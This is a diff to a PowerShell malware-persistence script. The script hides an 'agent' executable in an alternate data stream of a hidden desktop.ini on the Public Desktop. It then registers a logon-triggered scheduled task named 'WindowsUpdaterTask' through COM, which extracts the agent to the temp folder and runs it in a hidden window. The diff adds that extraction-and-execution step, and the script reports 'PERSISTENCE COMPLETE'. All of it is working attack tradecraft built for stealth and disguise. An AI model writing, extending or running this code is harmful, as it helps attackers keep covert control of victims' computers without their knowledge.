@@ -7,13 +7,12 @@ if (-not $agentPath) {
 }
 
 # ============================================================
-# 1. Choose carrier file (Public Desktop\desktop.ini)
+# 1. Carrier file on Public Desktop
 # ============================================================
 $publicDesktop = "C:\Users\Public\Desktop"
 $carrierFile = "$publicDesktop\desktop.ini"
 $streamName = "thumbs.db"
 
-# Create carrier if missing
 if (-not (Test-Path $carrierFile)) {
     Set-Content -Path $carrierFile -Value "[.ShellClassInfo]" -Encoding ASCII
     attrib +h +s $carrierFile
@@ -32,48 +31,47 @@ $hiddenPath = "$carrierFile`:$streamName"
 Write-Output "[+] Real agent hidden at: $hiddenPath"
 
 # ============================================================
-# 3. Create scheduled task via COM (no schtasks)
+# 3. Create scheduled task via COM (no admin needed)
 # ============================================================
 $taskName = "WindowsUpdaterTask"
-$execCommand = "powershell.exe -WindowStyle Hidden -Command Start-Process -WindowStyle Hidden '$hiddenPath'"
+
+# Extraction + execution command
+$extractCommand = @'
+$file = 'C:\Users\Public\Desktop\desktop.ini'
+$stream = 'thumbs.db'
+$tempPath = "$env:TEMP\agent.exe"
+$bytes = Get-Content -Path $file -Stream $stream -Encoding Byte -Raw
+[System.IO.File]::WriteAllBytes($tempPath, $bytes)
+Start-Process -WindowStyle Hidden $tempPath
+'@
+
+$commandLine = "powershell.exe -WindowStyle Hidden -Command `"$extractCommand`""
 
 try {
-    # Connect to Task Scheduler
     $taskService = New-Object -ComObject Schedule.Service
     $taskService.Connect()
     $rootFolder = $taskService.GetFolder("\")
-
-    # Delete existing task if any
     try { $rootFolder.DeleteTask($taskName, 0) } catch { }
 
-    # Create a new task definition
     $taskDefinition = $taskService.NewTask(0)
     $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
     $taskDefinition.Principal.UserId = $env:USERNAME
-    $taskDefinition.Principal.LogonType = 3 # TASK_LOGON_INTERACTIVE_TOKEN
+    $taskDefinition.Principal.LogonType = 3
 
-    # Add logon trigger
-    $trigger = $taskDefinition.Triggers.Create(9) # TASK_TRIGGER_LOGON
+    $trigger = $taskDefinition.Triggers.Create(9)
     $trigger.UserId = $env:USERNAME
 
-    # Add action (run PowerShell to launch hidden agent)
-    $action = $taskDefinition.Actions.Create(0) # TASK_ACTION_EXEC
+    $action = $taskDefinition.Actions.Create(0)
     $action.Path = "powershell.exe"
-    $action.Arguments = "-WindowStyle Hidden -Command Start-Process -WindowStyle Hidden '$hiddenPath'"
+    $action.Arguments = "-WindowStyle Hidden -Command `"$extractCommand`""
 
-    # Register the task (6 = UpdateOrCreate, 3 = InteractiveToken)
     $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) | Out-Null
-
     Write-Output "[+] Scheduled task '$taskName' created via COM. Agent will run at next logon."
 } catch {
-    Write-Output "[-] Failed to create scheduled task via COM: $_"
+    Write-Output "[-] Failed to create scheduled task: $_"
 }
 
-# ============================================================
-# Done (original agent remains – you can delete it manually if desired)
-# ============================================================
 Write-Output ""
 Write-Output "✅ PERSISTENCE COMPLETE"
-Write-Output "===================================="
 Write-Output "Real agent hidden in: $hiddenPath"
 Write-Output "Original agent still at: $agentPath (you may delete it after reboot)"
